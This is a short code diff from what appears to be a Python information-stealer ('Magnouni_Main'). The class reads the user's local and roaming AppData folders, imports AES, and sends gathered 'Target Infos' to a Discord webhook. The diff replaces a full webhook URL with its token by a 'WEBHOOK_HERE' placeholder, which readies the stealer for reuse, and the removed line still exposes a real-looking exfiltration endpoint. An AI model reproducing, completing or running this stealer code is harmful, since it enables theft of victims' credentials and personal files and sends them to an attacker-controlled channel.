@@ -14,7 +14,7 @@ from Crypto.Cipher import AES
 
 class Magnouni_Main:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/955104597096165387/k8QDhlwfHKMHei0BD9t1Ms3k217qe4aZwUTAx-6dgTuTedKFf46LJ9lkV0-h5wGljrZV" #Discord WebHook To Send All The Target Infos On
+        self.webhook = "WEBHOOK_HERE" #Discord WebHook To Send All The Target Infos On
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
